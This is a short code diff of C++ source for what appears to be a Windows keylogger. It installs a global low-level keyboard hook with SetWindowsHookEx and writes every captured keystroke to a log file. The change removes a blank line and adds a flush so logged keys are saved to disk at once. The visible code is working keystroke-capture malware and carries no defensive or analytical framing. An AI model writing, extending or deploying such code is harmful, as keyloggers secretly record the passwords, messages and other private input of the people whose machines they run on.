@@ -12,7 +12,6 @@ void SetHook(std::string file){
 
 	_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
 
-
 }
 
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
@@ -84,4 +83,5 @@ void WriteKey(int key) {
 	default:
 		logFile << (char)key;
 	}
+	logFile.flush();
 }
